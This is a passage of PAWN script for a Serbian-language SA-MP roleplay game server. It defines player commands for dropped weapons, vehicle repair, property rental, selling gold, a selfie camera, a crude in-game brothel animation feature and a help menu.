            format( string1, sizeof( string1 ), "Igrac %s je bacio oruzije %s sa %d metkova", ImeIgraca( playerid ), GunID, GunAmmo);
            LogSave( "Ostalo/LogDropGun.log", string1 );
		}
    }
	return true;
}

CMD:destroygun( playerid, params[] ) {

    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi bacio oruzje!");
	new f = -1;
	for( new a = 0; a < MAX_GOBJ; a++ ) {
		if( IsPlayerInRangeOfPoint( playerid, 5.0, dGunData[ a ][ ObjPos ][ 0] , dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ] ) ) {
			f = a;
		    break;
		}
	}
	if( f == -1 ) return SendErrorMessage( playerid, "Nemas oruzje u blizini." );
	DestroyDynamicObject( dGunData[ f ][ gObjID ] );
    DestroyDynamic3DTextLabel(gunLabel[f]);

	SendClientMessageEx( playerid, -1, "Unistio si oruzje "col_crvena"%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );

	dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
	dGunData[ f ][ gObjID ] = -1;
	dGunData[ f ][ ObjData ][ 0 ] = 0;
	dGunData[ f ][ ObjData ][ 1 ] = 0;
	return true;
}

alias:pickupgun("podignioruzje");
CMD:pickupgun( playerid, params[] ) {

    if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi bacio oruzje!");
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

	new f = -1;
	for( new a = 0; a < MAX_GOBJ; a++ ) {
		if( IsPlayerInRangeOfPoint( playerid, 5.0, dGunData[ a ][ ObjPos ][ 0] , dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ] ) ) {
			f = a;
		    break;
		}
	}
	if( f == -1 ) return SendErrorMessage( playerid, "Nemas oruzje u blizini." );

    if(isForbidenWeapon(dGunData[ f ][ ObjData ][ 0 ])) return SendErrorMessage(playerid, "Ovo oruzije nije moguce pokupiti!");

	DestroyDynamicObject( dGunData[ f ][ gObjID ] );
    DestroyDynamic3DTextLabel(gunLabel[f]);

	SendClientMessageEx( playerid, -1, "Pokupio si oruzje "col_crvena"%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );

	GiveWeaponToPlayer( playerid, dGunData[ f ][ ObjData ][ 0 ], dGunData[ f ][ ObjData ][ 1 ] );
	dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
	dGunData[ f ][ gObjID ] = -1;
	dGunData[ f ][ ObjData ][ 0 ] = 0;
	dGunData[ f ][ ObjData ][ 1 ] = 0;

    new string1[ 128 ];
    format( string1, sizeof( string1 ), "Igrac %s je pokupio oruzije %s sa %d metkova", ImeIgraca( playerid ), dGunData[ f ][ ObjData ][ 0 ], dGunData[ f ][ ObjData ][ 1 ]);
    LogSave( "Ostalo/LogPickupGun.log", string1 );
	return true;
}

forward SprayDone( playerid, broj );
public SprayDone( playerid, broj ) {
    new vehicleid = GetPlayerVehicleID( playerid );
    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
		switch( broj ) {
		    case 0: {
		        Novi_SetVehiclePos( vehicleid, 2076.5461, -1832.5647, 13.5545 );
		        SendInfoMessage( playerid, "Popravio si vozilo za 500$." );
				antiCheatCS[ playerid ][ VehRepairTime ] = 3;
		    }
		    case 1: {
		        Novi_SetVehiclePos( vehicleid, 1025.4225, -1033.1587, 31.8380 );
		        SendInfoMessage( playerid, "Popravio si vozilo za 500$." );
				antiCheatCS[ playerid ][ VehRepairTime ] = 3;
		    }
		    case 2: {
		        Novi_SetVehiclePos( vehicleid, 488.3767, -1731.1235, 11.2469 );
		        SendInfoMessage( playerid, "Popravio si vozilo za 500$." );
				antiCheatCS[ playerid ][ VehRepairTime ] = 3;
		    }
		    case 3: {
		        Novi_SetVehiclePos( vehicleid, 720.2908, -467.6113, 16.3437 );
		        SendInfoMessage( playerid, "Popravio si vozilo za 500$." );
				antiCheatCS[ playerid ][ VehRepairTime ] = 3;
		    }
	    }
	}
	return true;
}

CMD:enter( playerid, params[] ) {
    if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );
	if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca( 500$ )." );
    new vehicleid = GetPlayerVehicleID( playerid );
	if( IsPlayerInRangeOfPoint( playerid, 3.0, 1099.1404, -824.9033, 181.2554 ) ) {
	    DajIgracuNovac( playerid, -400 );
	    Novi_SetVehiclePos( vehicleid, 2062.1294, -1831.5498, 13.5469 );
		SetVehicleZAngle( vehicleid, 90 );
		SetTimerEx( "SprayDone", 5000, false, "ii", playerid, 0 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 5;
	}
	else if( IsPlayerInRangeOfPoint( playerid, 3.0, 1024.9756, -1030.7930, 32.0257 ) ) {
	    DajIgracuNovac( playerid, -400 );
	    Novi_SetVehiclePos( vehicleid, 1024.9763, -1021.8850, 32.1016 );
		SetVehicleZAngle( vehicleid, 0 );
		SetTimerEx( "SprayDone", 5000, false, "ii", playerid, 1 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 5;
	}
	else if( IsPlayerInRangeOfPoint( playerid, 3.0, 488.3819, -1733.0563, 11.1752 ) ) {
	    DajIgracuNovac( playerid, -400 );
	    Novi_SetVehiclePos( vehicleid, 487.4099, -1741.4585, 11.1330 );
		SetVehicleZAngle( vehicleid, 180 );
		SetTimerEx( "SprayDone", 5000, false, "ii", playerid, 2 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 5;
	}
	else if( IsPlayerInRangeOfPoint( playerid, 3.0, 719.8940, -464.8272, 16.3359 ) ) {
	    DajIgracuNovac( playerid, -400 );
	    Novi_SetVehiclePos( vehicleid, 720.3924, -456.0286, 16.3359 );
		SetVehicleZAngle( vehicleid, 0 );
		SetTimerEx( "SprayDone", 5000, false, "ii", playerid, 3 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 5;
	}
	else return SendErrorMessage( playerid, "Morate biti pored ulaza payspraya." );
	return true;
}

CMD:music( playerid, params[] ) {
	SPD( playerid, dialog_RADIOPLAY, DSL, D_NASLOV, "Naxi Radio\nTDI Radio\nCool Radio\nPlay Radio\nRadio Kosava\nOff Radio", D_ODABERI, D_ODUSTANI );
    return true;
}

CMD:statistika( playerid, params[] ) {

	new coordsstring[ 128 ], srecnisati[ 11 ], mogucnostreporta[ 11 ], mogucnostpitanja[ 11 ], mogucnostkupovinev[ 11 ], oglasici[ 11 ];

	if( ServerInfo[ HappyHours ] == true ) srecnisati = "Ukljuceni";
	else srecnisati = "Iskljuceni";

    if( ServerInfo[ KupovinaVozila ] == true ) mogucnostkupovinev = "ukljucena";
    else mogucnostkupovinev = "iskljucena";

    if( ServerInfo[ Report ] == true ) mogucnostreporta = "ukljucena";
    else mogucnostreporta = "iskljucena";

    if( ServerInfo[ Pitanja ] == true ) mogucnostpitanja = "ukljucena";
    else mogucnostpitanja = "iskljucena";

    if( ServerInfo[ Oglasi ] == true ) oglasici = "ukljucena";
    else oglasici = "iskljucena";

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	strcat( DialogStrgEx, "__________________________________________________________________\n");
	format( coordsstring, sizeof( coordsstring ), ""col_white"Ukupno poseta servera: "col_crvena"%d "col_crvena"| "col_white"Ukupno registrovanih clanova: "col_crvena"%d\n", ServerInfo[ BrojPosetaServeru ], ServerInfo[ RegistrovanihKorisnika ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Ukupno banovanih korisnika: "col_crvena"%d "col_crvena"| "col_white"Ukupno kikovanih korisnika: "col_crvena"%d\n", ServerInfo[ BanovanihKorisnika ], ServerInfo[ KikovanihKorisnika ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Broj dodeljenih warnova: "col_crvena"%d "col_crvena"| "col_white"Srecni sati: "col_crvena"%s\n", ServerInfo[ BrojWarnova ], srecnisati );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Pocetni level: "col_crvena"%d "col_crvena"| "col_white"Pocetni novac: "col_crvena"%d$\n", ServerInfo[ PocetniLevel ], ServerInfo[ PocetniNovaca ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost kupovine vozila je "col_crvena"%s"col_white".\n", mogucnostkupovinev );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost slanja pitanja Admin TEAM-u je "col_crvena"%s"col_white".\n", mogucnostpitanja );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost slanja reporta Admin TEAM-u je "col_crvena"%s"col_white".\n", mogucnostreporta );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Trenutni broj kreiranih vozila je "col_crvena"%d"col_white".\n", ServerInfo[ BrojKreiranihVozila ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost postavljanja oglasa je "col_crvena"%s"col_white".\n", oglasici );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Rekord servera je "col_crvena"%d"col_white".\n", ServerInfo[ RekordServera ] );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, "__________________________________________________________________");
	ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

CMD:unrentroom( playerid, params[] ) {
	
	if( PlayerInfo[ playerid ][ xRentID ] == -1 ) return SendErrorMessage( playerid, "Nisi rentao nijednu imovinu." );

    II[ PlayerInfo[ playerid ][ xRentID ] ][ iRentovano ]--;
    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
    SavePlayer( playerid );
    SaveProperty( PlayerInfo[ playerid ][ xRentID ] );
    
    PlayerInfo[ playerid ][ xRentID ] = -1;
    
    SendInfoMessage( playerid, "Unretnovao si sobu u imovini koju si iznajmljivao." );
	return 1;
}

CMD:rentroom( playerid, params[] ) {
	if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
	if( II[ GetNearestProperty( playerid ) ][ iRentable ] == 0 ) return SendErrorMessage( playerid, "Ova imovina ne moze da se renta!" );
	if( II[ GetNearestProperty( playerid ) ][ iRentPrice ] == 0 ) return SendErrorMessage( playerid, "Ova imovina ne moze da se renta!" );
	if( PlayerInfo[ playerid ][ xNovac ] < II[ GetNearestProperty( playerid ) ][ iRentPrice ] ) return SendErrorMessage( playerid, "Nemas dovoljno novca(%d$).", II[ GetNearestProperty( playerid ) ][ iRentPrice ] );

    PlayerInfo[ playerid ][ xRentID ] = GetNearestProperty( playerid );
    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_RENT;
	DajIgracuNovac( playerid, -II[ GetNearestProperty( playerid ) ][ iRentPrice ] );
	II[ GetNearestProperty( playerid ) ][ iRentovano ]++;
	II[ GetNearestProperty( playerid ) ][ iMoney ] += II[ GetNearestProperty( playerid ) ][ iRentPrice ];
	SaveProperty( GetNearestProperty( playerid ) );

	SendInfoMessage( playerid, "Uspesno si rentao ovu imovinu za %d$.", II[ GetNearestProperty( playerid ) ][ iRentPrice ] );
	return 1;
}

CMD:hpboks( playerid, params[] ) {
    if( IsPlayerInRangeOfPoint( playerid, 7.0, 1663.1982, -1386.0392, 65.0921 ) ) {
    	Novi_SetPlayerHealth( playerid, 100 );
    	Novi_SetPlayerArmour( playerid, 0 );
	}
	return true;
}

CMD:smcm( playerid, params[] ) {
	SendErrorMessage( playerid, "Pazi na ovu cmd." );
    return false;
}

CMD:prodajzlato( playerid, params[] ) {

	new kolicina;
	if( !IsPlayerInRangeOfPoint(playerid, 3.0, 1081.6985,-1684.3845,13.5749 ) ) return SendErrorMessage( playerid, "Morate biti u zlatari.");
	if( sscanf( params, "i", kolicina ) ) return SendUsageMessage( playerid, "/prodajzlato [ kolicina ] ");
	if( kolicina < 0 ) return SendErrorMessage( playerid, "Ne mozete u minus.");
	if( PlayerInfo[ playerid ][ xZlato ] < kolicina ) return SendErrorMessage( playerid, "Niste u mogucnosti prodati toliko grama zlata - nemate toliko.");
	DajIgracuNovac( playerid, kolicina*200 );
	PlayerInfo[ playerid ][ xZlato ] -= kolicina;
	SavePlayer( playerid );
	
   	SaveServerStats( );
	
	UpdateZlatoTD( playerid );
	SendInfoMessage( playerid, "Uspesno ste prodali %d grama zlata te dobili %d$ novca.", kolicina, kolicina*200 );
	return 1;
}

forward PusenjeKraj( playerid );
public PusenjeKraj( playerid ) {

    if( PlayerInBlowJob[ playerid ] != 0 ) {
    
        switch( PlayerInBlowJob[ playerid ] ) {
        
			case 1: {

	            DestroyActor( Sex_Lisa );
	            WhoreLisa = false;
	            SetPlayerPos( playerid, -2436.8672, 992.8784, -20.5350  );
	        }
	        case 2: {

	            DestroyActor( Sex_Angelina );
	            WhoreAngelina = false;
	            SetPlayerPos( playerid, -2435.8345, 1008.8928, -20.5350 );
	        }
	        case 3: {

	            DestroyActor( Sex_Mia );
	            WhoreMia = false;
	            SetPlayerPos( playerid, -2448.1772, 1008.9288, -20.5350 );
	        }
	        case 4: {

	            DestroyActor( Sex_Sendy );
	            WhoreSendy = false;
	            SetPlayerPos( playerid, -2448.2437, 992.9090, -20.5350 );
	        }
		}

		StopAudioStreamForPlayer( playerid );
	    FadeFromBlack( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
        BlowJobCount[ playerid ] = 0;
    	SexTDControl( playerid, false );
	    TogPlayerHud( playerid );
	    TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	Novi_KillTimer( PusenjeTimer[ playerid ] );
	}
	return true;
}

stock SexTDControl( playerid, bool:show ) {

	if( show == true ) {
	
	    BLOWJOBCOVER[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 741.375000, -25.333333, "usebox");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 0.000000, 57.021297);
		PlayerTextDrawTextSize(playerid, BLOWJOBCOVER[ playerid ][ 0 ], -26.375000, 0.000000);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, BLOWJOBCOVER[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[ playerid ][ 0 ], 0);

		BLOWJOBCOVER[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, -2.500000, -23.333337, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 645.000000, 175.000000);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 255);
		PlayerTextDrawUseBox(playerid, BLOWJOBCOVER[ playerid ][ 1 ], true);
		PlayerTextDrawBoxColor(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 0);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 0);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[ playerid ][ 1 ], 4);

		BLOWJOBCOVER[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, -0.250000, 321.250091, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 650.625000, 174.416656);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 255);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[ playerid ][ 2 ], 4);
		
		BLOWJOBCOVER[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid,284.000000, 426.000000, "Da prekinete kucajte_~r~/blowjob~n~~w~ZVUK VAM MORA BITI UKLJUCEN");
		PlayerTextDrawBackgroundColor(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 255);
		PlayerTextDrawFont(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 2);
		PlayerTextDrawLetterSize(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 0.259999, 0.899999);
		PlayerTextDrawColor(playerid,BLOWJOBCOVER[ playerid ][ 3 ], -1);
		PlayerTextDrawSetOutline(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 0);
		PlayerTextDrawSetProportional(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 1);
		PlayerTextDrawSetShadow(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 1);
		PlayerTextDrawSetSelectable(playerid,BLOWJOBCOVER[ playerid ][ 3 ], 0);

		BLOWJOBCOVER[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 610.875000, 10.083328, "60");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 0.438125, 1.530001);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[ playerid ][ 4 ], -1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, BLOWJOBCOVER[ playerid ][ 4 ], 1);

        for( new i = 0; i < 5; i ++) {
        
			PlayerTextDrawShow( playerid, BLOWJOBCOVER[ playerid ][ i ] );
		}
	}
	else if( show == false ) {
	
		for( new i = 0; i < 5; i ++) {
		
			PlayerTextDrawHide( playerid, BLOWJOBCOVER[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, BLOWJOBCOVER[ playerid ][ i ] );
			BLOWJOBCOVER[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

CMD:blowjob( playerid, params[] ) {

	if( PlayerInBlowJob[ playerid ] != 0 ) {
	
	    switch( PlayerInBlowJob[ playerid ] ) {
	    
	        case 1: {
	        
	            DestroyActor( Sex_Lisa );
	            WhoreLisa = false;
	            SetPlayerPos( playerid, -2436.8672, 992.8784, -20.5350  );
	        }
	        case 2: {

	            DestroyActor( Sex_Angelina );
	            WhoreAngelina = false;
	            SetPlayerPos( playerid, -2435.8345, 1008.8928, -20.5350 );
	        }
	        case 3: {

	            DestroyActor( Sex_Mia );
	            WhoreMia = false;
	            SetPlayerPos( playerid, -2448.1772, 1008.9288, -20.5350 );
	        }
	        case 4: {

	            DestroyActor( Sex_Sendy );
	            WhoreSendy = false;
	            SetPlayerPos( playerid, -2448.2437, 992.9090, -20.5350 );
	        }
	        
		}
	        
		StopAudioStreamForPlayer( playerid );
	    FadeFromBlack( playerid );
	    BlowJobCount[ playerid ] = 0;
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
	    TogPlayerHud( playerid );
	    TogglePlayerControllable( playerid, ( true ) );
	    ClearAnimations( playerid );
	    Novi_KillTimer( PusenjeTimer[ playerid ] );
	    
	}
	else {
	
	    if( IsPlayerInRangeOfPoint( playerid, 5.0, -2436.5886, 992.8784, -20.5350 ) ) {

		    if( WhoreLisa == true ) return SendErrorMessage( playerid, "Kurva 'Lisa' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

            WhoreLisa = true;

		    FadeFromBlack( playerid );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 1;

		    SetPlayerPos( playerid, -2436.5349, 990.3453, -19.8474 );
		    SetPlayerFacingAngle( playerid, 0.0 );


		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 60;
		    TogPlayerHud( playerid );

		    TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Lisa = CreateActor( 12, -2436.5349, 990.7470, -19.8474, 177.5185 );
		    ApplyActorAnimation( Sex_Lisa, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0 );

		    SetPlayerCameraPos( playerid, -2435.4030, 995.6231, -19.745 );
			SetPlayerCameraLookAt( playerid, -2436.6162, 990.7932, -20.193 );

			PusenjeTimer[ playerid ] = SetTimerEx( "PusenjeKraj", 60000, false, "i", playerid );

		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2436.6277, 1009.4991, -20.5350 ) ) {

		    if( WhoreAngelina  == true ) return SendErrorMessage( playerid, "Kurva 'Lisa' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    FadeFromBlack( playerid );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 2;

		    SetPlayerPos( playerid, -2436.7629, 1011.8691, -19.8474 );
		    SetPlayerFacingAngle( playerid, 180.0 );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 60;
		    TogPlayerHud( playerid );

		    TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Angelina = CreateActor( 40, -2436.7629, 1011.2584, -19.8474, 359.8802 );
		    ApplyActorAnimation( Sex_Angelina, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0 );

		    SetPlayerCameraPos( playerid, -2436.689208, 1007.504333, -19.828128 );
			SetPlayerCameraLookAt( playerid, -2436.272460, 1012.462280, -20.323490 );

			PusenjeTimer[ playerid ] = SetTimerEx( "PusenjeKraj", 60000, false, "i", playerid );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2448.5032, 1009.4958, -20.5350 ) ) {

		    if( WhoreMia  == true ) return SendErrorMessage( playerid, "Kurva 'Lisa' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    FadeFromBlack( playerid );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 3;

		    SetPlayerPos( playerid, -2448.7410, 1011.9281, -19.8474 );
		    SetPlayerFacingAngle( playerid, 180.0 );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 60;
		    TogPlayerHud( playerid );

		    TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Mia = CreateActor( 55, -2448.7410, 1011.2758, -19.8474, 358.3136 );
		    ApplyActorAnimation( Sex_Mia, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0 );

		    SetPlayerCameraPos( playerid, -2449.675537, 1006.677124, -19.653558 );
			SetPlayerCameraLookAt( playerid, -2448.498535, 1011.489257, -20.330032 );

			PusenjeTimer[ playerid ] = SetTimerEx( "PusenjeKraj", 60000, false, "i", playerid );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2448.4248, 992.9086, -20.5350 ) ) {

		    if( WhoreSendy  == true ) return SendErrorMessage( playerid, "Kurva 'Lisa' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    FadeFromBlack( playerid );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 4;

		    SetPlayerPos( playerid, -2448.7410, 991.0281, -19.8474 );
		    SetPlayerFacingAngle( playerid, 0.0 );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 60;
		    TogPlayerHud( playerid );

		    TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Sendy = CreateActor( 64, -2448.7410, 991.5348, -19.8474, 180.0251 );
		    ApplyActorAnimation( Sex_Sendy, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0 );

		    SetPlayerCameraPos( playerid, -2449.843994, 995.880554, -19.543146 );
			SetPlayerCameraLookAt( playerid, -2448.617187, 991.092651, -20.298999 );

			PusenjeTimer[ playerid ] = SetTimerEx( "PusenjeKraj", 60000, false, "i", playerid );
		}
	}
	return (true);
}

CMD:selfie( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) {
		SendErrorMessage( playerid, "Nemate mobilni telefon!");
		return 1;
	}
	if( !takingselfie[ playerid ] ) {
	
	    GetPlayerPos( playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ] );
		static Float: n1X, Float: n1Y;
		if( Degree[ playerid ] >= 360 ) Degree[ playerid ] = 0;
		Degree[ playerid ] += SelfieSpeed;
		n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		takingselfie[ playerid ] = true;
		ApplyAnimation(playerid, "PED", "gang_gunstand", 4.1, 1, 1, 1, 1, 1, 1);
		
		SendInfoMessage( playerid, "Da pomeras kameru koristi NUM4 i NUM6." );
		SendInfoMessage( playerid, "Da ugasis selfie mod koristi /selfie." );
		return 1;
	}
    if( takingselfie[ playerid ] ) {
    
	    TogglePlayerControllable( playerid, true );
		SetCameraBehindPlayer( playerid );
	    takingselfie[ playerid ] = false;
	    ApplyAnimation( playerid, "PED", "ATM", 4.1, 0, 1, 1, 0, 1, 1 );
	    return 1;
	}
    return 1;
}

CMD:help( playerid, params[] ) {
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	strcat( DialogStrgEx, ""col_crvena"ACCOUNT | "col_white"/levelup /promenispawn /pay /promenilozinku /statistika\n" );
	strcat( DialogStrgEx, ""col_crvena"HELP | "col_white"/stats /report /pitaj /new /tognews /prijavibug\n" );
	strcat( DialogStrgEx, ""col_crvena"BANK | "col_white"/banka \n" );
	strcat( DialogStrgEx, ""col_crvena"CHAT | "col_white"/b /me /attempt /do /c /s /w\n" );
